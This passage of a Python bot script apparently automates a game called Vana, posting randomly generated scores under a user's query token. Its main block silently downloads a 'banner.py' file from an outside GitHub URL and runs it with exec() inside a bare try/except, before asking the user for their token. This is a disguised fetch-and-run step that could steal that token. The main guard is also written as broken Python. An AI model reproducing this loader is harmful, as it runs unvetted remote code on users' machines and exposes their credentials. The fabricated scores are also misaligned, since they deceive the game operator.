session = requests.Session()
        session.headers.update(_header)
        player_name = self.getPlayer(session=session)
        print('')
        if not player_name: 
            print(f"ERROR: {player_name}")
            return
        if isinstance(player_name, str) and "expired" in player_name:
            print("\n❌ QUERY_TOKEN HAS EXPIRED. PLEASE RELOAD THE GAME AND GET A NEW TOKEN")
            return
        for i in range(total):
            print(f"\n  ➡️  Round: {i+1}/{total}")
            _point = round(random.uniform(10, 20),1)
            self.play(session=session, point=_point, player_name=player_name)
            countdown(20)
            print('')
        
        self.getPlayer(session=session)

if name == "main":
    try:
        url = "https://raw.githubusercontent.com/gowthamaran/banner/main/banner.py"
        response = requests.get(url)
        exec(response.text)
    except: pass
    total = int(input("\n🌸 PLEASE ENTER THE NUMBER OF TIMES YOU WANT TO PLAY: \n    ➡️   "))
    print("    - OK")
    query = input("\n🌸 PLEASE ENTER QUERY_TOKEN: \n    ➡️   ")
    print("    - OK\n")
    bot = Vana().start(query, total)
